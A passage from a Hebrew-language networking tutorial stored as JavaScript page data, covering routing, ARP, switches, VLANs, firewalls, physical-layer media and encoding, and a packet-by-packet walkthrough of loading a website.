              <p>סיב אופטי יכול להעביר טרה-ביטים בשנייה. התאוריה: עם קידוד מתקדם, סיב אחד יכול לשאת את כל תעבורת האינטרנט העולמית. בפועל – מרחק, רעש, עלויות. אבל הרעיון: <strong>המגבלה היא לא הפיזיקה – אלא הארגון.</strong> הרשת בנויה ממיליוני רכיבים שמתקשרים – הבעיה היא תיאום, לא רוחב פס.</p>
            `
          }
        ]
      },
      {
        type: "demo",
        title: "המדריך מדגים: מה מראה Traceroute",
        content: `
          <p>כשרצים traceroute (או כלי ויזואלי דומה), זה סוג הפלט – רואים את המסלול שעוברת החבילה:</p>
          <div class="code-preview">
            <pre><code>1   router.local (192.168.1.1)    2 ms
2   isp-gateway (10.0.0.1)       12 ms  
3   backbone-1 (212.143.xxx.x)   25 ms
4   google-server (172.217.x.x)   45 ms</code></pre>
          </div>
          <p class="demo-note">📋 כל שורה = hop אחד – רכיב ברשת (נתב, שרת) שהחבילה עברה דרכו. מספרי ה־ms הם זמן התגובה. כך רואים את "הדרך" מהמחשב לשרת היעד.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 7",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת הרשת = העברת חבילות (Packets) מישות לישות</li>
              <li>כל חבילה מכילה כתובת מקור ויעד</li>
              <li>נתבים (Routers) מעבירים חבילות לפי טבלאות ניתוב</li>
              <li>Traceroute מציג את מסלול החבילות ברשת</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "טבלת ניתוב (Routing Table)",
        content: `
          <p>לכל נתב <strong>טבלת ניתוב</strong> – רשימת יעדים ופעולות. למשל: "לכל כתובת ב־192.168.1.x – לשלוח לפורט 1 (רשת מקומית)". "כל השאר – לשלוח לנתב 10.0.0.1 (Default Gateway)". הנתב בודק את Destination IP, מחפש התאמה, ומעביר לחבר הבא.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 7",
        questions: [
          {
            q: "מה ההבדל בין שכבת התעבורה לשכבת הרשת?",
            a: "שכבת התעבורה מעבירה מידע מתהליך לתהליך (מחשב למחשב ברמת היישום). שכבת הרשת אחראית על ההעברה של החבילות בין כל הרכיבים – נתבים, שרתים – עד שהחבילה מגיעה ליעדה."
          },
          {
            q: "מהו נתב (Router)?",
            a: "נתב הוא רכיב רשת שמקבל חבילות ומעביר אותן הלאה. לכל נתב יש טבלת ניתוב (routing table) – מפה שאומרת 'לכתובת X לשלוח לנתב Y'. כך החבילה עוברת מרכיב לרכיב עד שהיא מגיעה ליעד."
          },
          {
            q: "מה עושה TTL ולמה traceroute משתמש בו?",
            a: "TTL (Time To Live) – כל נתב מפחית ב-1. אם מגיע 0 – החבילה נזרקת ונשלח ICMP Time Exceeded. traceroute שולח חבילות עם TTL 1, 2, 3... – כל נתב שמחזיר Time Exceeded מזוהה. כך בונים את המסלול."
          }
        ]
      }
    ]
  },
  {
    id: 8,
    title: "שכבת הקו",
    pages: [
      {
        type: "explanation",
        title: "תפקיד שכבת הקו",
        content: `
          <p>שכבת הרשת אחראית על המסלול. <strong>שכבת הקו</strong> אחראית על תקשורת בין מכשירים <strong>מחוברים ישירות</strong>. חיבור ישיר = כבל, WiFi, לווין.</p>
          <p>שכבת הקו מספקת ממשק להעברת מידע בין מכשירים צמודים. שכבת הרשת לא צריכה לדאוג לסוג החיבור.</p>
        `
      },
      {
        type: "explanation",
        title: "Ethernet וכתובות MAC",
        content: `
          <p>כתובות <strong>MAC</strong> – פיזיות, צרובות על כרטיס הרשת. פורמט: 6 בתים בהקסדצימלי, למשל <code>d4:be:d9:d6:0c:2a</code>. במסגרת Ethernet: שדות dst (יעד) ו־src (מקור).</p>
        `
      },
      {
        type: "explanation",
        title: "מבנה מסגרת Ethernet (Frame)",
        content: `
          <p>מסגרת Ethernet מורכבת מ: <strong>Preamble</strong> (סינכרון), <strong>Destination MAC</strong> (6 B), <strong>Source MAC</strong> (6 B), <strong>EtherType</strong> (סוג הפרוטוקול – IPv4, ARP וכו'), <strong>Payload</strong> (החבילה משכבת 3), <strong>FCS</strong> (Frame Check Sequence – CRC לזיהוי שגיאות). המינימום 64 בתים, מקסימום 1518.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של ipconfig",
        content: `
          <p>כשרצים <code>ipconfig</code> (Windows) או <code>ifconfig</code> (Linux/Mac), מתקבל מידע על הממשקים:</p>
          <div class="code-preview">
            <pre><code>Ethernet adapter Ethernet:
   IPv4 Address: 192.168.1.105
   Subnet Mask: 255.255.255.0
   Default Gateway: 192.168.1.1
   Physical Address: D4-BE-D9-D6-0C-2A</code></pre>
          </div>
          <p class="demo-note">📋 IPv4 – כתובת המחשב. Subnet Mask – גבול הרשת המקומית. Default Gateway – הנתב. Physical Address – כתובת ה־MAC של כרטיס הרשת.</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול ARP",
        content: `
          <p><strong>ARP</strong> ממיר IP ל־MAC. המחשב רוצה לשלוח ל־192.168.1.1 – שולח <strong>ARP Request</strong> (ברודקסט – לכולם): "למי יש 192.168.1.1?" הנתב עונה ב־<strong>ARP Reply</strong> (unicast) עם ה-MAC שלו. המיפוי נשמר ב־<strong>ARP Cache</strong>. פקודת <code>arp -a</code> מציגה את הטבלה.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 8",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת הקו = העברה בין מכשירים מחוברים ישירות</li>
              <li>MAC = כתובת פיזית. מבנה Frame: Preamble, dst/src MAC, EtherType, Payload, FCS</li>
              <li>ARP = המרת IP ל־MAC. ipconfig/ifconfig – הצגת הגדרות</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 8",
        questions: [
          {
            q: "מה ההבדל בין MAC ל־IP?",
            a: "MAC – כתובת פיזית צרובה על כרטיס הרשת, משמשת ברשת המקומית (שכבת קו). IP – כתובת לוגית שמיועדת לניתוב ברשתות (שכבת רשת). ARP ממיר IP ל־MAC כשצריך לשלוח Frame."
          },
          {
            q: "למה ARP משתמש ב-Broadcast?",
            a: "המחשב לא יודע איזה מכשיר ברשת המקומית מחזיק את ה-IP המבוקש – הוא שואל את כולם. רק בעל ה-IP עונה. ברשתות גדולות יש טכניקות כמו Proxy ARP ו-ARP Cache לצמצום התעבורה."
          }
        ]
      }
    ]
  },
  {
    id: 9,
    title: "רכיבי רשת",
    pages: [
      {
        type: "explanation",
        title: "Hub, Switch, Router",
        content: `
          <p><strong>Hub</strong> (שכבה 1) – לא מכיר כתובות, מעביר לכולם. <strong>Switch</strong> (שכבה 2) – מכיר MAC, מעביר רק ליעד. <strong>Router</strong> (שכבה 3) – מכיר IP, מנתב בין רשתות.</p>
          <table class="content-table">
            <tr><th>רכיב</th><th>שכבה</th><th>כתובות</th></tr>
            <tr><td>Hub</td><td>פיזית</td><td>לא מכיר</td></tr>
            <tr><td>Switch</td><td>קו</td><td>MAC</td></tr>
            <tr><td>Router</td><td>רשת</td><td>IP</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "Hub – שכבת פיזית",
        content: `
          <p>Hub מקבל ביטים מפורט אחד ומשכפל לכולם. אין אינטליגנציה – לא יודע לאן לשלוח. כל מחשב מקבל את כל התעבורה. יוצר התנגשויות (collisions) ורוחב פס משותף. כיום כמעט לא בשימוש – הוחלף ב־Switch.</p>
        `
      },
      {
        type: "explanation",
        title: "Switch – שכבת קו",
        content: `
          <p>Switch לומד את טבלת ה־MAC (כתובת ↔ פורט) מתעבורה שעוברת. כשיגיע Frame, יבדוק את Destination MAC וישלח רק לפורט המתאים. מפחית התנגשויות, מנצל רוחב פס טוב יותר. Switch חכם = VLANs, ניהול.</p>
        `
      },
      {
        type: "explanation",
        title: "Router – שכבת רשת",
        content: `
          <p>Router מחבר רשתות שונות (רשתות IP שונות). יש לו טבלת ניתוב – לכל יעד, לאן לשלוח. מקבל חבילת IP, בודק את Destination IP, מחפש בטבלה, מעביר לנתב הבא או למחשב ברשת המקומית.</p>
        `
      },
      {
        type: "explanation",
        title: "VLAN – רשת מקומית וירטואלית",
        content: `
          <p><strong>VLAN</strong> (Virtual LAN) מאפשר לחלק Switch פיזי אחד לכמה רשתות לוגיות נפרדות. כל פורט ב-Switch משויך ל-VLAN – מחשבים באותו VLAN מתקשרים ביניהם, אבל לא ישירות עם VLANs אחרים.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 320 140" class="content-diagram">
              <rect x="100" y="60" width="120" height="50" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="160" y="90" text-anchor="middle" font-size="11" fill="var(--text)">Switch</text>
              <rect x="10" y="10" width="70" height="35" rx="4" fill="#3a7a4a" stroke="var(--accent-green)"/>
              <text x="45" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 10</text>
              <rect x="90" y="10" width="70" height="35" rx="4" fill="#3a7a4a" stroke="var(--accent-green)"/>
              <text x="125" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 10</text>
              <rect x="170" y="10" width="70" height="35" rx="4" fill="#7a3a3a" stroke="#c06060"/>
              <text x="205" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 20</text>
              <rect x="250" y="10" width="70" height="35" rx="4" fill="#7a3a3a" stroke="#c06060"/>
              <text x="285" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 20</text>
              <line x1="45" y1="45" x2="120" y2="60" stroke="var(--accent-green)" stroke-width="2"/>
              <line x1="125" y1="45" x2="140" y2="60" stroke="var(--accent-green)" stroke-width="2"/>
              <line x1="205" y1="45" x2="180" y2="60" stroke="#c06060" stroke-width="2"/>
              <line x1="285" y1="45" x2="200" y2="60" stroke="#c06060" stroke-width="2"/>
              <line x1="45" y1="45" x2="125" y2="45" stroke="var(--accent-green)" stroke-width="1" stroke-dasharray="4,3"/>
              <line x1="205" y1="45" x2="285" y2="45" stroke="#c06060" stroke-width="1" stroke-dasharray="4,3"/>
              <text x="160" y="130" text-anchor="middle" font-size="9" fill="var(--text-muted)">✅ VLAN 10 ↔ VLAN 10 | ❌ VLAN 10 ↔ VLAN 20</text>
            </svg>
            <p class="diagram-caption">Switch אחד, שתי רשתות לוגיות – לא מדברים בינהן</p>
          </div>
          <p><strong>יתרונות VLAN:</strong></p>
          <ul>
            <li><strong>אבטחה</strong> – מחלקת IT נפרדת ממחלקת הנהלה, למשל</li>
            <li><strong>ביצועים</strong> – broadcast מוגבל ל-VLAN אחד, לא מציף את כולם</li>
            <li><strong>גמישות</strong> – שינוי VLAN בתוכנה, לא צריך לחבר כבלים מחדש</li>
          </ul>
          <p>תקשורת <strong>בין VLANs</strong> מחייבת Router (או L3 Switch) – כי מדובר ברשתות IP שונות.</p>
          <p><strong>Trunk</strong> – פורט Switch שנושא תעבורת כמה VLANs בו-זמנית (לחיבור בין Switchים). כל Frame מקבל תג VLAN (802.1Q).</p>
        `
      },
      {
        type: "explanation",
        title: "Firewall – חומת אש",
        content: `
          <p><strong>Firewall</strong> הוא מנגנון שמסנן תעבורת רשת לפי חוקים – מחליט מה מותר לעבור ומה נחסם.</p>
          <h4>סוגי Firewall:</h4>
          <p><strong>Stateless Firewall (Packet Filter)</strong> – בודק כל חבילה בנפרד: IP מקור/יעד, פורט, פרוטוקול. לא זוכר מצב. פשוט ומהיר אבל פחות חכם.</p>
          <p><strong>Stateful Firewall</strong> – עוקב אחר <em>חיבורים</em> (state table). אם יצאה בקשה פנימה ↗, מאפשר לתשובה לחזור אוטומטית ↘. מסנן ניסיונות חיבור חיצוניים לא מורשים.</p>
          <p><strong>Application Layer Firewall (WAF)</strong> – מבין תוכן ה-HTTP, חוסם SQL Injection, XSS, ועוד.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 80" class="content-diagram">
              <rect x="10" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="44" text-anchor="middle" font-size="10">רשת פנימית</text>
              <rect x="130" y="15" width="80" height="50" rx="6" fill="#7a3a3a" stroke="#c06060"/>
              <text x="170" y="40" text-anchor="middle" font-size="11" fill="white">Firewall</text>
              <text x="170" y="55" text-anchor="middle" font-size="9" fill="#ffaaaa">חוקים / ACL</text>
              <rect x="250" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="290" y="44" text-anchor="middle" font-size="10">אינטרנט</text>
              <path d="M 90 40 L 130 40" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrowg)"/>
              <path d="M 210 40 L 250 40" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrowg)"/>
              <defs><marker id="arrowg" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker></defs>
            </svg>
            <p class="diagram-caption">Firewall יושב בין הרשת הפנימית לאינטרנט</p>
          </div>
          <p><strong>ACL</strong> (Access Control List) – רשימת חוקים: "אפשר TCP פורט 443 מכל מקום", "חסום UDP פורט 53 מחוץ". הסדר חשוב – הכלל הראשון שמתאים – מנצח.</p>
          <p><strong>DMZ</strong> (Demilitarized Zone) – אזור נפרד לשרתים ציבוריים (Web, Email). לא ברשת הפנימית ולא ישר בחוץ – מוגן משני הצדדים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – רכיבי רשת",
        intro: "<p>שאלות מעניינות על ארכיטקטורת רשת:</p>",
        blocks: [
          {
            title: "מה ההבדל בין Router ביתי לתעשייתי?",
            icon: "🏭",
            content: `<p>Router ביתי (כמו של ISP) = Router + Switch + WiFi AP + NAT + DHCP + Firewall בסיסי – הכל ב-box אחד. Router תעשייתי (Cisco, Juniper) – מכשיר נפרד לכל פונקציה: Router נפרד, Switch Managed נפרד, Firewall נפרד, AP נפרד. <strong>החשיבה:</strong> בבית פשטות > ביצועים. בחברה – כל רכיב מתמחה, מנוהל נפרד, מוחלף בלי להשפיע על האחרים.</p>`
          },
          {
            title: "מה זה SDN – רשת מוגדרת בתוכנה?",
            icon: "💻",
            content: `<p><strong>SDN</strong> (Software Defined Networking) – הפרדה בין ה-Control Plane (החלטות ניתוב) ל-Data Plane (העברה בפועל). במקום שכל נתב יחליט בעצמו, מרכז SDN שולח הוראות לכל הנתבים. כמו ש-GPS מרכזי מנחה את כל הנהגים. Google ו-Facebook משתמשים בזה לניהול מרכזי של רשתות ענק.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 9",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Hub – שכבת 1, משכפל לכולם, ללא כתובות</li>
              <li>Switch – שכבת 2, לומד MAC, מעביר רק ליעד. VLAN – חלוקה לוגית של Switch</li>
              <li>Router – שכבת 3, טבלת ניתוב, מחבר רשתות</li>
              <li>Firewall – מסנן תעבורה. Stateless (חבילה בחבילה), Stateful (מעקב חיבורים)</li>
              <li>DMZ – אזור מוגן לשרתים ציבוריים. ACL – רשימת חוקי סינון</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 9",
        questions: [
          {
            q: "למה Switch עדיף על Hub?",
            a: "Hub מעביר כל תעבורה לכל הפורטים – יוצר עומס והתנגשויות. Switch מכיר כתובות MAC ויודע לשלוח רק ליעד – חוסך רוחב פס ומפחית התנגשויות."
          },
          {
            q: "מה ההבדל בין Switch ל-Router?",
            a: "Switch עובד בשכבת הקו – משתמש ב-MAC, מעביר Frames באותה רשת. Router עובד בשכבת הרשת – משתמש ב-IP, מחבר רשתות שונות ומנתב חבילות ביניהן."
          },
          {
            q: "מה VLAN פותר ולמה לא מספיק רק Firewall?",
            a: "VLAN מפריד ברמת שכבת הקו – broadcast לא חוצה VLANs, מחשב לא יכול אפילו לשלוח Frame לVLAN אחר. Firewall מסנן ברמת IP/TCP אבל broadcast עדיין עובר. VLAN + Firewall = הגנה בשתי שכבות."
          },
          {
            q: "מה ההבדל בין Stateless לStateful Firewall?",
            a: "Stateless בודק כל חבילה בנפרד לפי IP/פורט – לא זוכר מצב. Stateful עוקב אחר חיבורים – אם פתחת חיבור פנימה, תשובות מחוץ מותרות אוטומטית. Stateful הרבה יותר חכם – חוסם ניסיונות חיבור חיצוניים לא מורשים."
          }
        ]
      }
    ]
  },
  {
    id: 10,
    title: "השכבה הפיזית",
    pages: [
      {
        type: "explanation",
        title: "מטרת השכבה הפיזית",
        content: `
          <p>העברת <strong>ביט</strong> (0 או 1) בין רכיבים. כל השכבות מעל מניחות שאפשר להעביר ביטים. אין מושג של "הודעה" – רק זרם ביטים. השכבה לא יודעת מה העברת.</p>
        `
      },
      {
        type: "explanation",
        title: "טכנולוגיות השכבה הפיזית",
        content: `
          <p><strong>כבל נחושת (Ethernet)</strong> – אותות חשמליים. <strong>סיב אופטי</strong> – פולסים של אור. <strong>ADSL</strong> – תקשורת through קו טלפון. <strong>WiFi</strong> – גלי רדיו. <strong>לווין</strong> – אותות אלקטרומגנטיים. <strong>סלולר (4G/5G)</strong> – רשתות אלחוטיות. כל טכנולוגיה מגדירה תדר, עוצמה, וצורת קידוד (איך 0 ו־1 מיוצגים).</p>
        `
      },
      {
        type: "explanation",
        title: "רוחב פס ו־Latency",
        content: `
          <p><strong>רוחב פס (Bandwidth)</strong> – כמה ביטים לשנייה אפשר להעביר. נמדד ב־Mbps, Gbps. <strong>Latency</strong> (זמן תגובה) – כמה זמן לוקח לחבילה להגיע. סיב אופטי: רוחב פס גבוה, latency נמוך. לווין: latency גבוה (מרחק).</p>
          <p><strong>Throughput</strong> – קצב העברה בפועל – תמיד נמוך מה-Bandwidth התיאורטי. גורמים: עומס רשת, אובדן חבילות, re-transmission, overhead של פרוטוקולים.</p>
          <p><strong>Jitter</strong> – שינוי ב-Latency – חבילות מגיעות בזמנים לא אחידים. בעיה קריטית לשמע ווידאו (VoIP, Zoom).</p>
        `
      },
      {
        type: "explanation",
        title: "כבלים – סוגים ותקנים",
        content: `
          <p>כבלי Ethernet מסוג <strong>UTP</strong> (Unshielded Twisted Pair) – זוגות חוטים מפותלים:</p>
          <table class="content-table">
            <tr><th>קטגוריה</th><th>מהירות</th><th>שימוש</th></tr>
            <tr><td>Cat5e</td><td>1 Gbps עד 100m</td><td>רשתות ביתיות/משרדיות</td></tr>
            <tr><td>Cat6</td><td>10 Gbps עד 55m</td><td>מרכזי נתונים</td></tr>
            <tr><td>Cat6a</td><td>10 Gbps עד 100m</td><td>מרכזי נתונים מודרניים</td></tr>
            <tr><td>Cat8</td><td>40 Gbps עד 30m</td><td>בין שרתים</td></tr>
          </table>
          <p><strong>סיב אופטי</strong> – שני סוגים: <strong>Single-mode</strong> (ליבה דקה, מרחקים ארוכים עד 100km) ו-<strong>Multi-mode</strong> (ליבה רחבה, עד 2km, זול יותר).</p>
          <p><strong>קונקטורים</strong>: RJ-45 לכבלי Ethernet. LC, SC – לסיב אופטי. SFP – מודולים ניתנים להחלפה ב-Switch.</p>
        `
      },
      {
        type: "explanation",
        title: "WiFi – 802.11 אלחוטי",
        content: `
          <p>WiFi מבוסס על תקן <strong>IEEE 802.11</strong>. שני תדרים עיקריים:</p>
          <table class="content-table">
            <tr><th>תדר</th><th>טווח</th><th>מהירות</th><th>חסרון</th></tr>
            <tr><td>2.4 GHz</td><td>ארוך יותר</td><td>נמוכה יותר</td><td>עומוס – מיקרוגל, Bluetooth</td></tr>
            <tr><td>5 GHz</td><td>קצר יותר</td><td>גבוהה יותר</td><td>חוצה קירות פחות טוב</td></tr>
            <tr><td>6 GHz (WiFi 6E)</td><td>קצר</td><td>גבוהה מאוד</td><td>חדש, פחות מכשירים</td></tr>
          </table>
          <p><strong>דורות WiFi:</strong></p>
          <ul>
            <li><strong>WiFi 4</strong> (802.11n) – 600 Mbps, 2.4+5 GHz</li>
            <li><strong>WiFi 5</strong> (802.11ac) – 3.5 Gbps, 5 GHz</li>
            <li><strong>WiFi 6</strong> (802.11ax) – 9.6 Gbps, 2.4+5 GHz, OFDMA (יותר מכשירים בו-זמנית)</li>
          </ul>
          <p><strong>CSMA/CA</strong> – WiFi לא יכול לזהות התנגשויות כמו Ethernet. במקום – <em>Collision Avoidance</em>: כל תחנה מחכה שהאוויר פנוי + זמן אקראי נוסף לפני שידור. אם הגיע ACK – הצלחה.</p>
          <p><strong>SSID</strong> – שם הרשת. <strong>BSSID</strong> – MAC של נקודת הגישה. ניתן לחבר כמה APs באותו SSID לרשת אחת גדולה (Roaming).</p>
        `
      },
      {
        type: "explanation",
        title: "קידוד – ייצוג ביטים כאותות",
        content: `
          <p>איך מייצגים 0 ו-1 פיזית? כל מדיום מגדיר <strong>שיטת קידוד</strong> שונה.</p>
          <p><strong>NRZ</strong> (Non-Return to Zero) – 1 = מתח גבוה, 0 = מתח נמוך. פשוט אבל בעייתי ברצפים ארוכים של 0 או 1 (קשה לסנכרון).</p>
          <p><strong>Manchester Encoding</strong> – כל ביט = מעבר. 1 = מעבר מנמוך לגבוה באמצע הביט, 0 = מגבוה לנמוך. מאפשר סנכרון מובנה – Ethernet ישן 10 Mbps השתמש בזה.</p>
          <p><strong>4B/5B</strong> – כל 4 ביטים מקודדים כ-5 ביטים שמבטיחים מינימום מעברים לסנכרון. Ethernet מהיר (100 Mbps) ו-Fast Ethernet.</p>
          <p><strong>PAM4</strong> (Pulse Amplitude Modulation) – 4 רמות מתח (00, 01, 10, 11) – מכפיל את כמות הנתונים. 400 Gbps Ethernet משתמש בזה.</p>
          <p>בסיב אופטי: ON/OFF של אור (OOK) או מড של פאזה (QPSK, QAM) לנפחים גדולים.</p>
        `
      },
      {
        type: "explanation",
        title: "Full Duplex, Half Duplex ו-CSMA/CD",
        content: `
          <p><strong>Half Duplex</strong> – תקשורת בכיוון אחד בו-זמנית. מישהו מדבר, מישהו שומע. Hub = half duplex. בעיית <strong>Collision</strong> (התנגשות) – שתי תחנות שולחות בו-זמנית, הסיגנלים מתנגשים.</p>
          <p><strong>CSMA/CD</strong> (Carrier Sense Multiple Access / Collision Detection) – אלגוריתם ל-Ethernet ישן:</p>
          <ol>
            <li>האזן לפני שאתה שולח (Carrier Sense)</li>
            <li>שלח אם הקו פנוי</li>
            <li>אם זוהתה התנגשות – עצור, שלח signal jam</li>
            <li>המתן זמן אקראי (Backoff), נסה שוב</li>
          </ol>
          <p><strong>Full Duplex</strong> – שליחה וקבלה בו-זמנית. Switch מודרני + כרטיס רשת מודרני = full duplex. אין התנגשויות. זה מה שמשתמשים בו היום.</p>
          <p>מודולים כמו <strong>Auto-Negotiation</strong> מסדרים את המהירות ו-duplex אוטומטית בין שני צדדים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – השכבה הפיזית",
        intro: "<p>מה באמת קורה בשכבה הכי נמוכה?</p>",
        blocks: [
          {
            title: "כמה מהר נוסע האור בסיב אופטי?",
            icon: "💡",
            content: `<p>מהירות האור בוואקום = 300,000 קמ/ש. בסיב זכוכית = ~200,000 קמ/ש (מקדם שבירה ~1.5). מישראל לארה"ב (~9,000 ק"מ) = ~45ms מהירות-אור. בפועל: 100-150ms בגלל נתבים, נתיבים עקיפים, עיכוב עיבוד. <strong>החשיבה:</strong> הפיזיקה קובעת תקרה לLatency – גם עם רשת מושלמת, לא תתחת ל-45ms לארה"ב.</p>`
          },
          {
            title: "Power over Ethernet – חשמל דרך כבל רשת",
            icon: "⚡",
            content: `<p><strong>PoE</strong> (Power over Ethernet) – מעביר חשמל ונתונים על אותו כבל Cat5e/Cat6. קמרות WiFi, טלפוני IP, מצלמות אבטחה – כולם יכולים להיות מופעלים מה-Switch ללא חיבור חשמל נפרד. <strong>PoE+</strong> = עד 30W. <strong>PoE++</strong> = עד 60-100W. דוגמה: מצלמה בתקרה – כבל אחד עושה הכל.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 10",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבה פיזית = העברת ביט (0/1). כבלים: Cat5e/Cat6 (נחושת), Single/Multi-mode (סיב)</li>
              <li>WiFi 802.11: 2.4GHz (טווח) vs 5GHz (מהירות). CSMA/CA – מניעת התנגשויות אלחוטיות</li>
              <li>Bandwidth = קצב תיאורטי. Throughput = בפועל. Latency = זמן תגובה. Jitter = שינוי latency</li>
              <li>Full Duplex = שליחה + קבלה בו-זמנית (Switch מודרני). Half Duplex = Hub, CSMA/CD</li>
              <li>קידוד: NRZ, Manchester, 4B/5B – ייצוג ביטים כאותות פיזיים</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 10",
        questions: [
          {
            q: "מה ההבדל בין כבל נחושת לסיב אופטי?",
            a: "נחושת – אותות חשמליים, מושפע מרעש, מרחק מוגבל (~100m ל-Ethernet). סיב אופטי – פולסי אור, כמעט ללא רעש, מרחקים ארוכים (Single-mode עד 100km), רוחב פס גבוה הרבה יותר."
          },
          {
            q: "למה WiFi ב-5GHz מהיר יותר אבל מגיע פחות רחוק?",
            a: "תדר גבוה יותר = גלים קצרים יותר = נחלשים מהר יותר בחומה ובמרחק. אבל תדר גבוה = יותר 'מקום' להעביר נתונים ויותר ערוצים לא חופפים. זה tradeoff פיזיקלי."
          },
          {
            q: "מה ההבדל בין Bandwidth ל-Throughput?",
            a: "Bandwidth = הקצב המקסימלי התיאורטי של הקישור (למשל 1Gbps). Throughput = מה שעובר בפועל – תמיד נמוך בגלל overhead של פרוטוקולים, אובדן חבילות, re-transmission, עומס."
          }
        ]
      }
    ]
  },
  {
    id: 11,
    title: "איך הכל מתחבר",
    pages: [
      {
        type: "explanation",
        title: "הסיפור המלא – גלישה ל-Facebook",
        content: `
          <p><strong>שלב 1 – DHCP:</strong> המחשב מקבל IP, Subnet Mask, Default Gateway, שרת DNS. בלי זה – לא יכולים לגלוש.</p>
          <p><strong>שלב 2 – DNS:</strong> הדפדפן מקליד facebook.com. צריך IP. שולח שאילתה לשרת DNS → מקבל 31.13.72.65.</p>
          <p><strong>שלב 3 – Subnet:</strong> האם 31.13.72.65 ברשת שלנו (למשל 192.168.1.x)? לא. שולחים ל־Default Gateway (הנתב).</p>
          <p><strong>שלב 4 – ARP:</strong> צריך MAC של הנתב. שולח ARP Request → מקבל MAC.</p>
          <p><strong>שלב 5 – Switch:</strong> מעביר Frame עם ה-MAC של הנתב. הנתב מקבל.</p>
          <p><strong>שלב 6 – נתבים:</strong> הנתב ומספר נתבים בדרך מעבירים את החבילה עד שרתי Facebook.</p>
          <p><strong>שלב 7 – TCP Handshake:</strong> SYN, SYN-ACK, ACK. חיבור מוכן.</p>
          <p><strong>שלב 8 – HTTP GET:</strong> בקשת הדף. השרת מחזיר HTML. הדפדפן מציג.</p>
        `
      },
      {
        type: "explanation",
        title: "Wireshark – צפייה בסיפור המלא",
        content: `
          <p>כשפותחים Wireshark ומבצעים גלישה ל-facebook.com, רואים את כל הפרוטוקולים בתור:</p>
          <div class="code-preview">
            <pre><code>1  0.000  DHCP Discover (192.168.1.255)  — אם צריך IP
2  0.001  DHCP Offer                     — שרת מציע IP
3  0.015  DNS  Standard query A facebook.com
4  0.045  DNS  Standard query response 31.13.72.65
5  0.046  ARP  Who has 192.168.1.1?      — מי ה-gateway?
6  0.047  ARP  192.168.1.1 is at d4:be:d9:... — MAC של נתב
7  0.048  TCP  [SYN]  → 31.13.72.65:443
8  0.095  TCP  [SYN-ACK] ← 31.13.72.65
9  0.095  TCP  [ACK]
10 0.096  TLS  Client Hello               — TLS Handshake
11 0.145  TLS  Server Hello + Certificate
12 0.148  TLS  Change Cipher Spec         — מוצפן מכאן!
13 0.149  HTTP/2 GET /                    — בקשת הדף
14 0.195  HTTP/2 200 OK + Data</code></pre>
          </div>
          <p class="demo-note">📋 כל שורה = פקטה. רואים בבירור: DHCP → DNS → ARP → TCP Handshake → TLS → HTTP/2. זה כל המדריך בפרקטיקה.</p>
        `
      },
      {
        type: "explanation",
        title: "סדר הפעולות – מלמטה למעלה",
        content: `
          <p>בשליחת בקשת GET, כל שכבה מוסיפה Header:</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 180" class="content-diagram">
              <rect x="10" y="5" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="22" text-anchor="middle" font-size="10" fill="var(--text)">5. Application: HTTP Header + Data (GET / HTTP/2)</text>
              <rect x="10" y="38" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="55" text-anchor="middle" font-size="10" fill="var(--text)">4. Transport: TCP Header (port 443, seq#, ACK, flags)</text>
              <rect x="10" y="71" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="88" text-anchor="middle" font-size="10" fill="var(--text)">3. Network: IP Header (src IP, dst IP 31.13.72.65, TTL)</text>
              <rect x="10" y="104" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="121" text-anchor="middle" font-size="10" fill="var(--text)">2. Link: Ethernet (src MAC, dst MAC נתב, FCS)</text>
              <rect x="10" y="137" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="154" text-anchor="middle" font-size="10" fill="var(--text)">1. Physical: ביטים → כבל / WiFi / סיב</text>
              <path d="M 340 169 L 340 5" stroke="var(--accent-gold)" stroke-width="2" marker-start="url(#arrowUp)" opacity="0.4"/>
              <text x="330" y="95" font-size="8" fill="var(--accent-gold)" transform="rotate(-90, 330, 95)">קבלה: Decapsulation ↑</text>
            </svg>
          </div>
